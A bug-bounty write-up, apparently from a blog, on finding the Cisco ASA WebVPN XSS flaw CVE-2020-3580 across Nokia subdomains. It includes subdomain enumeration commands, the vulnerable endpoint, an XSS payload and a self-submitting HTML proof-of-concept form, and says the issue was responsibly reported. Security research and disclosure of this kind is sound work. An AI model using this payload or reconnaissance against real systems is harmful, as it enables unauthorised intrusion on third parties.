Cisco Adaptive Security Appliance (ASA) is widely used for corporate VPN access, firewall protection, and threat management. However, it's not immune to vulnerabilities. One notable issue is **CVE-2020-3580**, a cross-site scripting (XSS) vulnerability affecting the WebVPN portal. This flaw allows attackers to inject malicious scripts, potentially compromising connected systems.

In this post, I’ll walk you through how I discovered this vulnerability on multiple Nokia subdomains using reconnaissance techniques.

## 🕵️‍♂️ Reconnaissance

The first step in bug bounty hunting or vulnerability research is always **reconnaissance**. My goal was to map Nokia's attack surface and identify potentially vulnerable assets. For this, I used several tools and methods.

### 🌐 Subdomain Enumeration

I began with passive reconnaissance to gather subdomains and associated IPs for Nokia. I used the following tools:

- **Sublist3r**
- **Amass**
- **Subfinder**

```bash
subfinder -d nokia.com -o nokia-subdomains.txt
amass enum -d nokia.com -o nokia-amass.txt
```

This gave me a list of publicly known subdomains. Next, I looked for endpoints hosting web interfaces. Using `httpx`, I fingerprinted the subdomains to identify VPN login pages or Cisco ASA WebVPN portals.

```bash
cat nokia-subdomains.txt nokia-amass.txt | sort -u > subdomains.txt
cat subdomains.txt | httpx -status-code -title -tech-detect -o output.txt
```

Several subdomains returned HTTP 200 responses and were hosting exposed WebVPN portals.

## 🧪 Proof of Concept (PoC)

To test for **CVE-2020-3580**, I sent a POST request to:

```
/+CSCOE+/saml/sp/acs?tgname=a
```

...with a malicious `SAMLResponse` parameter containing an XSS payload:

```html
"><svg/onload=alert('XSS')>
```

Here's the PoC HTML form I used to trigger the vulnerability:

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://████/+CSCOE+/saml/sp/acs?tgname=a" method="POST">
      <input type="hidden" name="SAMLResponse" value="&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;&apos;XSS&apos;&#41;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## ⚠️ CVE-2020-3580: Findings on Nokia Subdomains

I wrote a Bash script to automate checking each subdomain for this vulnerability. Many subdomains were indeed vulnerable, and I responsibly reported them to Nokia via their disclosure program.
